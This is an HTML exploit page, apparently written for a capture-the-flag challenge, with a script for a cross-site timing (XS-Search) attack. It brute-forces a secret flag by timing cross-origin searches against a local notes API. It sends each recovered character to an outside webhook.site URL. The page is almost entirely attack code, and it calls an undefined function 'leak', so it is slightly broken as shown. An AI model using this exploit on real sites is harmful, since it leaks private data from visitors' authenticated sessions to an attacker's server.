<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <h1>System Loading...</h1>
    <script>
        const TARGET = 'http://localhost:3031'; 
        const REPORT_URL = 'https://webhook.site/c52095bc-72e6-4717-80a3-37bddf872811'; 
        let flag = "RS{a"; 
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";

        function report(data) {
            fetch(`${REPORT_URL}?log=${encodeURIComponent(data)}`);
        }

        async function check(query) {
            const start = performance.now();

            await fetch(`${TARGET}/api/notes?search=${query}`, { mode: 'no-cors' });
            const end = performance.now();

            return end - start; 
        }

        async function bruteForce() {
            report("start: " + flag);
            
           while (!flag.endsWith("}")) {
                let found = false;
                for (let c of chars) {
                    if (await leak(flag + c)) {
                        flag += c;
                        report("찾은 글자: " + flag);
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    report("다시.");
                    break;
                }
            }
        }

        bruteForce();
    </script>
</body>
</html>
